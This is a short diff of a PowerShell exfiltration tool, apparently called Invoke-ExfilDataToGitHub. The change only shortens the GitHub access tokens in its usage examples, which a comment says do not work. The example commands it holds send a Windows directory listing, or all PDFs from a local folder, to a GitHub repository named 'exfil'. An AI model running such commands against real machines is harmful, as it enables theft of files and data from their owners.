@@ -43,11 +43,11 @@ Recursively get files from subdirectories of given local filepath
 .EXAMPLE
 # This example exfiltrates data to a file - keys do not work
 
-Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ==" 
+Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0Mzll==" 
                                                 -GHFilePath "testfolder/" -GHFileName "testfile3" -Data (dir c:\Windows | Out-String )
 .EXAMPLE
 # This example exfiltrates files from a given directory and filter
-Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ=="
+Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0Mzll=="
    -GHFilePath "testfolder/" -LocalfilePath "C:\temp\" -Filter "*.pdf"
 
 #>
@@ -281,6 +281,6 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
 
 # Examples - keys do not work
 
-#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDNlN==" -GHFilePath "testfolder" -LocalfilePath "C:\temp" -Filter "*.*" -Recurse
+#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDN==" -GHFilePath "testfolder" -LocalfilePath "C:\temp" -Filter "*.*" -Recurse
 
-#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDNlNw==" -GHFilePath "testfolder/" -GHFileName "myfile.txt" -Data (dir c:\Windows | Out-String )
+#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDN==" -GHFilePath "testfolder/" -GHFileName "myfile.txt" -Data (dir c:\Windows | Out-String )
